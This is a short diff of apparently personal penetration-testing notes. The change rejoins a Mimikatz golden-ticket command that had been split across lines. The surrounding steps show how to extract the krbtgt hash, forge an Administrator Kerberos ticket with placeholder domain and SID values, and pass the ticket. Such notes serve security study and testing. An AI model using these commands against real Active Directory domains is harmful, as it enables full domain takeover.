@@ -926,10 +926,7 @@ Debug Privilege: access to LSASS: Local Security Authority Subsystem Service -> 
 2. Use kerberos module to get a krbtgt hash ```kerberos::hash```
 3. With RC4/AES, forge a ticket (may need username - Admin is common, domain is common)
 4. Manufacturing ticket:
-5. ```kerberos::golden /admin:Administrator /domain:f4rmc0rp.com
-/sid:S-1-1-12-123456789-1234567890-123456789
-/krbtgt:deadbeefcafeface003133700009999
-/ticket:Administrator.tkt``` Note: may need tyo specify group accesses to be enabled if Admin does not have access to some groups
+5. ```kerberos::golden /admin:Administrator /domain:f4rmc0rp.com /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefcafeface003133700009999 /ticket:Administrator.tkt``` Note: may need tyo specify group accesses to be enabled if Admin does not have access to some groups
 6. Execute the ticket by passing the ticket: ```kerberos::ptt```
 ###
 
